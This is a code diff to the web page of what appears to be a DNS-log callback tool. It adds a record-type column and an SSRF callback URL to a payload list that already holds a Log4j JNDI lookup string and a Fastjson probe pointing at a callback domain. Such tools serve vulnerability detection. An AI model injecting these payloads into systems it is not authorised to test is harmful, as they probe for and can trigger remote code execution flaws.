@@ -27,13 +27,15 @@
         <table id="myRecords" width=700 border="0" cellpadding="5" cellspacing="1" bgcolor="#EFF3FF"
                style="word-break:break-all; word-wrap:break-all;">
             <tr bgcolor="#ADD3EF">
-                <th width="50%">DNS Query Record</th>
-                <th width="25%">IP Address</th>
-                <th width="25%">Created Time</th>
+                <th>DNS Query Record</th>
+                <th>Type</th>
+                <th>IP Address</th>
+                <th>Created Time</th>
             </tr>
             <td v-if="DnsData == ''" colspan="3" align="center">No Data</td>
             <tr v-for="item in DnsData">
                 <td>{{ item.Subdomain }}</td>
+                <td>{{ item.Type }}</td>
                 <td>{{ item.Ipaddress }}</td>
                 <td>{{ item.Time }}</td>
             </tr>
@@ -97,7 +99,8 @@
             randDomain: "",
             payload: {
                 "Log4j": "${jndi:ldap://domain:9999/aaa}",
-                "Fastjson": '{"@type":"java.net.Inet4Address","val":"domain"}'
+                "Fastjson": '{"@type":"java.net.Inet4Address","val":"domain"}',
+                "SSRF": "",
             },
         },
         methods: {
@@ -152,7 +155,7 @@
                 document.execCommand("Copy"); // 执行浏览器复制命令
                 let creatDom = document.getElementById("creatDom");
                 creatDom.parentNode.removeChild(creatDom);
-
+                this.payload["SSRF"] = location.protocol + "//" + location.host + "/" + this.domain.split(".")[0] + "/"
                 app.randDomain = randDomain
                 alert("复制成功");
             }
